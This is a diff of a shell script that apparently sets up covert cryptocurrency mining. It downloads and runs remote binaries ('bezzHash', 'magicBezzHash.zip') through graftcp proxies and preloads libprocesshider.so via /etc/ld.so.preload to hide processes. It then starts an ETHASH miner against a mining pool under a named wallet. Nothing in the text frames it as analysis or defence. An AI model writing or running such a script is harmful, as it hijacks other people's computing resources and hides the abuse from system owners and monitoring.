@@ -36,7 +36,10 @@ echo " "
 
 echo "**"
 
+local/graftcp-local
+
 ./graftcp/graftcp curl ifconfig.me
+./graftcp go get -v golang.org/x/net/proxy
 
 echo " "
 
@@ -48,11 +51,11 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/udumb4r4/script/raw/main/bezzHash
+./graftcp wget https://github.com/udumb4r4/script/raw/main/bezzHash
 
 chmod +x bezzHash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+./graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 
 unzip magicBezzHash.zip
 
@@ -64,4 +67,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
+./graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
